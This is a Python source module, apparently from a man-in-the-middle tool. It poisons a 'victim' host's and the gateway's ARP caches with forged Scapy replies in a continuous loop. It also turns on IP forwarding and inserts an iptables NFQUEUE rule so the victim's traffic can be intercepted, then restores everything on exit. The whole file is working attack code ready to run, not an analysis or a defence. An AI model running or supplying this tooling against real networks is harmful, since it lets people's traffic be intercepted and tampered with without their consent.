"""ARP spoofing + iptables setup/teardown for MITM positioning.

This module handles the *network plumbing* required to redirect the victim's
traffic through the local NFQUEUE:

1. **ARP spoofing** — poison the victim's ARP cache so traffic destined for
   the gateway arrives at our interface instead.  (Reuses the proven logic
   from the ``arp_spoofer`` project.)
2. **IP forwarding** — enable ``/proc/sys/net/ipv4/ip_forward`` so the
   kernel still routes intercepted packets onward.
3. **NFQUEUE rule** — insert an ``iptables`` rule that sends packets from
   the victim through the NFQUEUE for our interceptor to process.

Everything is automatically torn down on ``SIGINT`` / ``SIGTERM`` or
exception — the network is **always** left clean.
"""

from __future__ import annotations

import ipaddress
import logging
import os
import platform
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from typing import Callable

LOGGER = logging.getLogger(__name__)

# Silence Scapy's noisy runtime/IPv6 warnings *before* importing it.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    import scapy.all as scapy  # noqa: WPS433
except ImportError:
    scapy = None  # type: ignore[assignment]

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BROADCAST_MAC: str = "ff:ff:ff:ff:ff:ff"
ARP_REPLY_OP: int = 2
SLEEP_INTERVAL: float = 2.0
RESTORE_PACKET_COUNT: int = 4
LINUX_IP_FORWARD_PATH: str = "/proc/sys/net/ipv4/ip_forward"
NFQUEUE_QUEUE_NUM: int = 0
NFQUEUE_CHAIN: str = "INPUT"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def is_root() -> bool:
    """Return True if running as root (POSIX only)."""
    return hasattr(os, "geteuid") and os.geteuid() == 0


def require_root() -> None:
    """Exit with a helpful message if not root."""
    if not is_root():
        LOGGER.error(
            "Root privileges required. Re-run with: sudo %s ...",
            os.path.basename(sys.argv[0]),
        )
        sys.exit(1)


def is_private_ip(ip_str: str) -> bool:
    """Return True if *ip_str* is in an RFC 1918 / private range."""
    try:
        addr = ipaddress.ip_address(ip_str)
        return addr.is_private
    except ValueError:
        return False


def detect_interface() -> str | None:
    """Auto-detect the default outgoing interface via Scapy."""
    if scapy is None:
        return None
    try:
        return scapy.conf.iface
    except Exception:  # noqa: BLE001
        return None


def detect_gateway() -> str | None:
    """Auto-detect the default gateway from the routing table."""
    if scapy is None:
        return None
    try:
        gw = scapy.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:  # noqa: BLE001
        pass
    return None


# ---------------------------------------------------------------------------
# ARP resolution
# ---------------------------------------------------------------------------

def get_mac(ip: str, retries: int = 3, timeout: float = 2.0) -> str | None:
    """Resolve an IP to a MAC via ARP broadcast."""
    if scapy is None:
        return None
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=BROADCAST_MAC)
    for _ in range(retries):
        answered = scapy.srp(broadcast / arp, timeout=timeout, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
    return None


def resolve_or_exit(ip: str, role: str) -> str:
    """Resolve a MAC or exit with a clear error."""
    mac = get_mac(ip)
    if mac is None:
        LOGGER.error("Cannot resolve MAC for %s (%s). Is it online?", role, ip)
        sys.exit(1)
    LOGGER.debug("%s %s is at %s", role.capitalize(), ip, mac)
    return mac


# ---------------------------------------------------------------------------
# ARP spoof / restore
# ---------------------------------------------------------------------------

def spoof(target_ip: str, target_mac: str, impersonate_ip: str) -> None:
    """Send a single forged ARP reply to poison *target_ip*'s cache."""
    pkt = scapy.ARP(op=ARP_REPLY_OP, pdst=target_ip, hwdst=target_mac,
                     psrc=impersonate_ip)
    scapy.send(pkt, verbose=False)


def restore(target_ip: str, source_ip: str) -> None:
    """Heal *target_ip*'s ARP cache for *source_ip*."""
    dst_mac = get_mac(target_ip)
    src_mac = get_mac(source_ip)
    if dst_mac is None or src_mac is None:
        LOGGER.warning("Cannot fully restore ARP for %s <- %s (host offline?).", target_ip, source_ip)
        return
    pkt = scapy.ARP(op=ARP_REPLY_OP, pdst=target_ip, hwdst=dst_mac,
                     psrc=source_ip, hwsrc=src_mac)
    scapy.send(pkt, count=RESTORE_PACKET_COUNT, verbose=False)


# ---------------------------------------------------------------------------
# IP forwarding
# ---------------------------------------------------------------------------

def enable_ip_forwarding() -> str | None:
    """Enable IPv4 forwarding; return the previous value for restore."""
    if platform.system() != "Linux":
        LOGGER.warning("Auto IP forwarding only supported on Linux.")
        return None
    try:
        with open(LINUX_IP_FORWARD_PATH, "r", encoding="ascii") as f:
            original = f.read().strip()
        with open(LINUX_IP_FORWARD_PATH, "w", encoding="ascii") as f:
            f.write("1\n")
        LOGGER.debug("IP forwarding enabled (was %s)", original)
        return original
    except OSError as exc:
        LOGGER.error("Failed to enable IP forwarding: %s", exc)
        return None


def restore_ip_forwarding(original: str | None) -> None:
    """Restore IP forwarding to its previous value."""
    if original is None or platform.system() != "Linux":
        return
    try:
        with open(LINUX_IP_FORWARD_PATH, "w", encoding="ascii") as f:
            f.write(f"{original}\n")
        LOGGER.debug("IP forwarding restored to %s", original)
    except OSError as exc:
        LOGGER.error("Failed to restore IP forwarding: %s", exc)


# ---------------------------------------------------------------------------
# iptables NFQUEUE rule management
# ---------------------------------------------------------------------------

def _run_iptables(args: list[str], check: bool = False) -> bool:
    """Run an iptables command. Returns True on success."""
    cmd = ["iptables"] + args
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            if check:
                return False
            LOGGER.warning("iptables %s failed: %s", " ".join(args), result.stderr.strip())
        return result.returncode == 0
    except FileNotFoundError:
        LOGGER.error("iptables not found. Is it installed?")
        return False
    except subprocess.TimeoutExpired:
        LOGGER.error("iptables command timed out.")
        return False


def install_nfqueue_rule(
    victim_ip: str,
    queue_num: int = NFQUEUE_QUEUE_NUM,
) -> bool:
    """Insert an iptables rule sending *victim_ip*'s traffic to NFQUEUE."""
    rule = [
        "INPUT",
        "-s", victim_ip,
        "-j", "NFQUEUE",
        "--queue-num", str(queue_num),
    ]
    success = _run_iptables(rule)
    if success:
        LOGGER.info("iptables NFQUEUE rule installed for %s (queue %d).", victim_ip, queue_num)
    return success


def remove_nfqueue_rule(
    victim_ip: str,
    queue_num: int = NFQUEUE_QUEUE_NUM,
) -> None:
    """Remove the iptables NFQUEUE rule for *victim_ip*."""
    rule = [
        "-D", "INPUT",
        "-s", victim_ip,
        "-j", "NFQUEUE",
        "--queue-num", str(queue_num),
    ]
    _run_iptables(rule, check=False)


# ---------------------------------------------------------------------------
# MITM orchestrator — ties everything together
# ---------------------------------------------------------------------------

@dataclass
class MitmSession:
    """Holds MITM state so we can tear it down cleanly."""

    target_ip: str
    gateway_ip: str
    interface: str | None = None
    queue_num: int = NFQUEUE_QUEUE_NUM

    # Populated during setup
    target_mac: str = ""
    gateway_mac: str = ""
    original_forwarding: str | None = None
    spoof_running: bool = False
    _spoof_thread_active: bool = field(default=False, repr=False)

    # Callbacks
    on_cleanup: Callable[[], None] | None = None

    def setup(self) -> None:
        """ARP-poison, enable forwarding, install iptables rule."""
        require_root()

        self.target_mac = resolve_or_exit(self.target_ip, "target")
        self.gateway_mac = resolve_or_exit(self.gateway_ip, "gateway")

        self.original_forwarding = enable_ip_forwarding()
        install_nfqueue_rule(self.target_ip, self.queue_num)
        self.spoof_running = True

    def spoof_loop(self) -> None:
        """Run ARP spoofing in a blocking loop (call from main thread)."""
        LOGGER.info("ARP poisoning started. Ctrl+C to stop.")
        sent = 0
        try:
            while self.spoof_running:
                spoof(self.target_ip, self.target_mac, self.gateway_ip)
                spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
                sent += 2
                print(f"\r[+] ARP packets sent: {sent}", end="", flush=True)
                time.sleep(SLEEP_INTERVAL)
        except KeyboardInterrupt:
            print()
        finally:
            self.cleanup()

    def cleanup(self) -> None:
        """Restore everything: ARP caches, iptables, IP forwarding."""
        if not self.spoof_running:
            return
        self.spoof_running = False
        LOGGER.info("Restoring network state...")

        restore(self.target_ip, self.gateway_ip)
        restore(self.gateway_ip, self.target_ip)
        remove_nfqueue_rule(self.target_ip, self.queue_num)
        restore_ip_forwarding(self.original_forwarding)

        if self.on_cleanup is not None:
            self.on_cleanup()

        LOGGER.info("Network fully restored.")


def create_session(
    target_ip: str,
    gateway_ip: str | None = None,
    interface: str | None = None,
    queue_num: int = NFQUEUE_QUEUE_NUM,
    on_cleanup: Callable[[], None] | None = None,
) -> MitmSession:
    """Create and return a configured (but not yet started) MitmSession."""
    gw = gateway_ip or detect_gateway()
    if gw is None:
        LOGGER.error("No gateway supplied and auto-detection failed. Use --gateway.")
        sys.exit(1)

    if gw == target_ip:
        LOGGER.error("Target and gateway must be different addresses.")
        sys.exit(1)

    iface = interface or detect_interface()

    return MitmSession(
        target_ip=target_ip,
        gateway_ip=gw,
        interface=iface,
        queue_num=queue_num,
        on_cleanup=on_cleanup,
    )
